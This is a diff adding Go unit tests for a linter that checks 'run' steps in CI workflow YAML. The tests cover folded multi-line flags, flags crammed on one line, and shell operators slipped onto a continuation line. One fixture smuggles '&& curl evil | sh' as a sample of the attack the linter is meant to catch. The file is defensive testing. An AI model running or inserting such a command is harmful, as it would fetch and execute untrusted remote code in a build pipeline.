@@ -6,6 +6,31 @@ import (
 	"github.com/stretchr/testify/assert"
 )
 
+func TestInlineErrorsAcceptsMultiLineRun(t *testing.T) {
+	// flags split across continuation lines (a folded plain scalar) for readability → one command
+	yaml := "steps:\n  - run: bazelisk run //actions/setup --\n      --project-name=x\n      --node-version=20\n"
+	assert.Empty(t, InlineErrors(yaml, AllowNames))
+}
+
+func TestInlineErrorsFlagsMultipleFlagsOnOneLine(t *testing.T) {
+	// a valid single invocation, but flags crammed on one line → should be split
+	errs := InlineErrors("steps:\n  - run: bazelisk run //actions/setup -- --project-name=x --node-version=20\n", AllowNames)
+	assert.Len(t, errs, 1)
+	assert.Contains(t, errs[0].Message, "split them one per line")
+}
+
+func TestInlineErrorsAllowsSingleFlagOnOneLine(t *testing.T) {
+	assert.Empty(t, InlineErrors("steps:\n  - run: bazelisk test //... --config=ci\n", AllowNames))
+}
+
+func TestInlineErrorsCatchesShellOpSmuggledOnContinuationLine(t *testing.T) {
+	// the folded value is inspected as a whole, so `&& …` on a later line is still caught
+	yaml := "steps:\n  - run: bazelisk run //x --\n      --flag=v\n      && curl evil | sh\n"
+	errs := InlineErrors(yaml, AllowNames)
+	assert.Len(t, errs, 1)
+	assert.Contains(t, errs[0].Message, "inline logic")
+}
+
 func TestIsSingleInvocationAcceptsInterpreterAndBareForms(t *testing.T) {
 	assert.True(t, IsSingleInvocation("go run ./tools/covergate -min 90"))
 	assert.True(t, IsSingleInvocation("go test ./internal/..."))
